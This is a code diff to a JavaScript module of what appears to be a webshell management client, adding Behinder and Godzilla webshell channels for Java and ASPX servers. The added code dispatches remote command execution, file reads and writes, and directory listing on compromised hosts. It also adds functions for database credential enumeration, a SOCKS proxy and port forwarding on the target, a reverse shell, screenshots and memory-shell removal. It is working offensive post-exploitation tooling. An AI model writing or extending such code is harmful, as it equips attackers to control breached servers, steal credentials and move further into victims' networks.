@@ -10,6 +10,10 @@ import { systemExec, phpEval } from "./cmd.js";
 import { runCommand as bmodRun } from "./behinder-mod.js";
 import { runCommand as gmodRun } from "./godzilla-mod.js";
 import { evalPhp as behinderEval } from "./behinder.js";
+import { runCommand as javaRun, fetchInfo as javaInfo, listDir as javaList, readFile as javaRead, writeFile as javaWrite } from "./behinder-java.js";
+import { runCommand as gjRun, fetchInfo as gjInfo, listDir as gjList, readFile as gjRead, writeFile as gjWrite, invalidate as gjInvalidate, call as gjCall } from "./godzilla-java.js";
+import { runCommand as axRun, fetchInfo as axInfo, listDir as axList, readFile as axRead, writeFile as axWrite } from "./behinder-aspx.js";
+import { runCommand as gaRun, fetchInfo as gaInfo, listDir as gaList, readFile as gaRead, writeFile as gaWrite, invalidate as gaInvalidate } from "./godzilla-aspx.js";
 import { evalPhp as godzillaEval, invalidate as godzillaInvalidate } from "./godzilla.js";
 import * as cb from "./command-build.js";
 import * as sn from "./snippets.js";
@@ -31,6 +35,11 @@ export async function runCommand(conn, command) {
 		// 魔改通道的哨兵分隔符只看连接显式 OS（不回探——避免与 osOf 互相递归）
 		case "behinder-mod": return bmodRun(conn, command, conn.os === "windows" ? "windows" : "linux");
 		case "godzilla-mod": return (await gmodRun(conn, command)).toString("utf8");
+		case "behinder-java": return javaRun(conn, command);
+		case "godzilla-java": return gjRun(conn, command);
+		case "behinder-aspx": return axRun(conn, command);
+		case "godzilla-aspx": return gaRun(conn, command);
+		case "dsh-mem": return memRun(conn, command);
 		default: throw new Error(`通道 ${conn.protocol} 暂不支持命令执行`);
 	}
 }
@@ -54,12 +63,18 @@ export async function runSnippet(conn, code) {
 	throw new Error("当前通道无 eval 能力——仅 PHP eval 马与自研/桥接通道支持结构化操作");
 }
 
-/** OS 解析：连接配置显式指定优先，auto 则探测一次（%OS% 回显技巧）。 */
+/** OS 解析：连接配置显式指定优先，auto 则探测一次（behinder-java 走 WsmProbe 自带 os.name）。 */
 export async function osOf(conn) {
 	const explicit = conn.os;
 	if (explicit === "linux" || explicit === "windows") return explicit;
 	const k = conn.id ?? conn.url;
 	if (osCache.has(k)) return osCache.get(k);
+	if (["behinder-java", "godzilla-java", "behinder-aspx", "godzilla-aspx"].includes(conn.protocol)) {
+		const info = conn.protocol === "behinder-java" ? await javaInfo(conn) : conn.protocol === "godzilla-java" ? await gjInfo(conn) : conn.protocol === "behinder-aspx" ? await axInfo(conn) : await gaInfo(conn);
+		const os = info?.osName?.toLowerCase().includes("win") ? "windows" : "linux";
+		if (info) { osCache.set(k, os); return os; }
+		throw new Error("OS 探测失败：WsmProbe 无结构化回显");
+	}
 	const out = await runCommand(conn, cb.OS_PROBE_COMMAND);
 	const parsed = cb.parseOsProbe(out);
 	if (!parsed) throw new Error("OS 探测失败：无法识别回显");
@@ -69,6 +84,15 @@ export async function osOf(conn) {
 
 /** 基本信息（结构化优先）。 */
 export async function basicInfo(conn) {
+	if (conn.protocol === "behinder-java" || conn.protocol === "godzilla-java" || conn.protocol === "behinder-aspx") {
+		const info = conn.protocol === "behinder-java" ? await javaInfo(conn) : conn.protocol === "godzilla-java" ? await gjInfo(conn) : await axInfo(conn);
+		if (!info) throw new Error("基本信息获取失败：WsmProbe 无回显");
+		return {
+			user: info.user, os: info.osName.toLowerCase().includes("win") ? "windows" : "linux",
+			cwd: info.realPath || info.userDir, osDetail: info.osName,
+			java: info.java, cpus: info.cpus, home: info.home, raw: info
+		};
+	}
 	if (await canEval(conn)) {
 		const r = await runSnippet(conn, sn.phpBasicInfo());
 		if (r && !r.error) {
@@ -88,6 +112,15 @@ export async function basicInfo(conn) {
 
 /** 目录列表 → [{name,isDir,size,perm,owner,mtime,epoch,writable}]。 */
 export async function listDir(conn, path) {
+	if (["behinder-java", "godzilla-java", "behinder-aspx", "godzilla-aspx"].includes(conn.protocol)) {
+		const arr = conn.protocol === "behinder-java" ? await javaList(conn, path) : conn.protocol === "godzilla-java" ? await gjList(conn, path) : conn.protocol === "behinder-aspx" ? await axList(conn, path) : await gaList(conn, path);
+		return arr.map((e) => ({
+			name: e.n, isDir: Boolean(e.d), size: Number(e.s) || 0,
+			perm: (e.r ? "r" : "-") + (e.w ? "w" : "-"), owner: "",
+			mtime: e.m ? new Date(Number(e.m)).toISOString().slice(0, 19).replace("T", " ") : "",
+			epoch: Number(e.m) || 0, writable: Boolean(e.w)
+		}));
+	}
 	if (await canEval(conn)) {
 		const r = await runSnippet(conn, sn.phpLs(path));
 		if (Array.isArray(r)) {
@@ -107,6 +140,10 @@ export async function listDir(conn, path) {
 /** 读文件（二进制安全）→ Buffer。 */
 export async function readFile(conn, path) {
 	if (conn.protocol === "dsh-aes") return aesRead(conn, path);
+	if (conn.protocol === "behinder-java") return (await javaRead(conn, path)).body;
+	if (conn.protocol === "godzilla-java") return gjRead(conn, path);
+	if (conn.protocol === "behinder-aspx") return axRead(conn, path);
+	if (conn.protocol === "godzilla-aspx") return gaRead(conn, path);
 	if (await canEval(conn)) {
 		const r = await runSnippet(conn, sn.phpRead(path));
 		if (r?.error) throw new Error(`读取失败：${r.error}`);
@@ -121,6 +158,10 @@ export async function readFile(conn, path) {
 export async function writeFile(conn, path, data) {
 	const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
 	if (conn.protocol === "dsh-aes") return aesWrite(conn, path, buf);
+	if (conn.protocol === "behinder-java") return javaWrite(conn, path, buf);
+	if (conn.protocol === "godzilla-java") return gjWrite(conn, path, buf);
+	if (conn.protocol === "behinder-aspx") return axWrite(conn, path, buf);
+	if (conn.protocol === "godzilla-aspx") return gaWrite(conn, path, buf);
 	// do-while：空文件也要写一轮（file_put_contents 空串=创建空文件），否则 0 字节假成功
 	let off = 0, first = true;
 	do {
@@ -211,4 +252,70 @@ export function invalidateConn(connId) {
 	osCache.delete(connId);
 	evalCache.delete(connId);
 	godzillaInvalidate(connId);
+	gjInvalidate(connId);
+	gaInvalidate(connId);
+}
+
+//#endregion
+
+//#region Java 编译载荷专属动作（WsmDb 数据库 / WsmMemUnload 内存马卸载）
+
+/** JDBC 数据库操作（behinder-java 通道，WsmDb 载荷）→ JSON 解析结果。 */
+export async function javaDb(conn, op, args = {}) {
+	const params = {
+		u: String(args.url ?? ""),
+		n: String(args.username ?? ""),
+		p: String(args.password ?? ""),
+		o: op,
+		b: String(args.database ?? ""),
+		t: String(args.table ?? ""),
+		s: String(args.sql ?? ""),
+		d: String(args.driver ?? "")
+	};
+	const out = await sendJavaPayload0(conn, "WsmDb", params);
+	try { return JSON.parse(out); } catch { throw new Error(`WsmDb 输出非 JSON：${out.slice(0, 200)}`); }
+}
+
+async function sendJavaPayload0(conn, name, params) {
+	const { sendJavaPayload } = await import("./behinder-java.js");
+	return sendJavaPayload(conn, name, params);
+}
+
+/** 网络动作（behinder-java 通道）：socks（目标侧 SOCKS5）/ fwd（端口转发）/ reverse（反弹 shell）。 */
+export async function netAction(conn, kind, args = {}) {
+	const { sendJavaPayload } = await import("./behinder-java.js");
+	if (kind === "socks") return sendJavaPayload(conn, "WsmSocks", { p: String(args.port ?? "18080"), a: args.any ? "*" : "" }).then(clean);
+	if (kind === "fwd") return sendJavaPayload(conn, "WsmFwd", { l: String(args.listen ?? ""), h: String(args.host ?? ""), t: String(args.port ?? ""), a: args.any ? "*" : "" }).then(clean);
+	if (kind === "reverse") return sendJavaPayload(conn, "WsmReverse", { h: String(args.host ?? ""), p: String(args.port ?? "") }).then(clean);
+	throw new Error(`未知网络动作 ${kind}`);
+}
+
+/** ZIP 压缩/解压（behinder-java 通道，WsmZip 载荷）。 */
+export async function zipAction(conn, op, src, dst) {
+	const { sendJavaPayload } = await import("./behinder-java.js");
+	return sendJavaPayload(conn, "WsmZip", { o: op, s: src, d: dst }).then(clean);
+}
+
+/** 连接池/数据源凭据枚举（behinder-java 通道，WsmEnumDb 载荷）→ JSON。 */
+export async function enumDataSources(conn) {
+	const { sendJavaPayload } = await import("./behinder-java.js");
+	const out = await sendJavaPayload(conn, "WsmEnumDb", {});
+	try { return JSON.parse(out); } catch { throw new Error(`WsmEnumDb 输出非 JSON：${out.slice(0, 200)}`); }
+}
+
+/** 截屏（behinder-java 通道，WsmShot 载荷）→ PNG Buffer。 */
+export async function screenshot(conn) {
+	const { sendJavaPayload } = await import("./behinder-java.js");
+	const out = await sendJavaPayload(conn, "WsmShot", {});
+	return Buffer.from(out, "base64");
+}
+
+function clean(t) { return String(t).trim(); }
+
+/** 内存马卸载（behinder-java 通道，WsmMemUnload 载荷）。name 空 = 读 x-n 登记属性。 */
+export async function memUnload(conn, name = "") {
+	const { sendJavaPayload } = await import("./behinder-java.js");
+	const out = await sendJavaPayload(conn, "WsmMemUnload", { n: String(name ?? "") });
+	if (out.startsWith("!ERR")) throw new Error(`卸载失败：${out.slice(4).trim()}`);
+	return out.trim();
 }
